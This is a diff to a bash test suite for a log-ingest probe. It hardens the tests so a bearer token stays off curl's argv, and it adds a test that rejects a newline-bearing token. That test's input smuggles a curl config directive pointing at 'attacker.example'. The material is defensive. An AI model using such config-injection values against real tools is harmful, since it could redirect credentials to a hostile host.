@@ -61,7 +61,13 @@ STUB_DIR="$TMP/bin"; mkdir -p "$STUB_DIR"
 cat > "$STUB_DIR/curl" <<'STUB_EOF'
 #!/usr/bin/env bash
 argv="$*"
-[[ "$argv" == *"Authorization: Bearer"* ]] || { echo "stub-curl: missing Authorization header" >&2; exit 64; }
+# The bearer must arrive on curl's STDIN config channel (`--config -`) and be ABSENT from argv: argv
+# is world-readable via /proc/<pid>/cmdline and `ps`. Both halves are asserted, never either-or.
+[[ "$argv" == *"Authorization"* || "$argv" == *"Bearer"* || "$argv" == *"synthetic-token-for-tests"* ]] \
+  && { echo "stub-curl: bearer credential present on argv" >&2; exit 66; }
+[[ "$argv" == *"--config -"* ]] || { echo "stub-curl: missing --config - (stdin config channel)" >&2; exit 67; }
+stdin_cfg="$(cat)"
+[[ "$stdin_cfg" == 'header = "Authorization: Bearer '*'"' ]] || { echo "stub-curl: missing Authorization header on stdin" >&2; exit 64; }
 [[ "$argv" == *"--data-raw"* ]] || { echo "stub-curl: missing --data-raw" >&2; exit 64; }
 # -w '%{http_code}' is how the probe learns the status at all. Without it real curl prints
 # nothing (the body already goes to /dev/null), $http is empty, and every classification case
@@ -155,6 +161,20 @@ if [[ "$out" == *"INGEST_PROBE_UNCONFIGURED"* ]]; then
   pass "unset token → UNCONFIGURED (never reported as a refusal)"
 else
   fail "unset token → expected INGEST_PROBE_UNCONFIGURED, got '$out'"
+fi
+
+# A token carrying a newline would inject a curl config directive on the stdin channel. The shape
+# guard must refuse it with ZERO curl calls and a non-success rc, never a verdict.
+CALLS="$TMP/curl-calls"; : > "$CALLS"
+CNT_DIR="$TMP/bin-count"; mkdir -p "$CNT_DIR"
+printf '#!/usr/bin/env bash\necho called >> "%s"\nexit 0\n' "$CALLS" > "$CNT_DIR/curl"; chmod +x "$CNT_DIR/curl"
+rc=0
+out="$(PATH="$CNT_DIR:$PATH" BETTERSTACK_LOGS_TOKEN=$'abc\nurl = "https://attacker.example/"' \
+  BETTERSTACK_INGEST_URL="https://s0000000.eu-fsn-3.betterstackdata.com/" bash "$PROBE" 2>&1)" || rc=$?
+if [[ "$out" == *"INGEST_PROBE_UNCONFIGURED"* && "$rc" -eq 2 && ! -s "$CALLS" ]]; then
+  pass "a newline-bearing token → UNCONFIGURED rc=2 with zero curl calls"
+else
+  fail "newline token → expected UNCONFIGURED rc=2 and no curl call, got rc=$rc calls=$(wc -l < "$CALLS") out='$out'"
 fi
 
 echo "--- destination guard: the token must not be forwarded to an arbitrary host ---"
@@ -312,7 +332,7 @@ fi
 # and the 4 review adds (3 authority-cut fixtures + the reconciliation) = 31.
 # Stated as a derivation from main's 15 rather than a bare literal: a sibling PR raising the base
 # silently invalidates a copied number, so re-read `git show origin/main:<this file>` at ship.
-EXPECTED_CASES=31
+EXPECTED_CASES=32
 echo
 echo "cases=$CASES passed=$PASS failed=$FAIL"
 if [[ $((PASS + FAIL)) -ne "$CASES" ]]; then
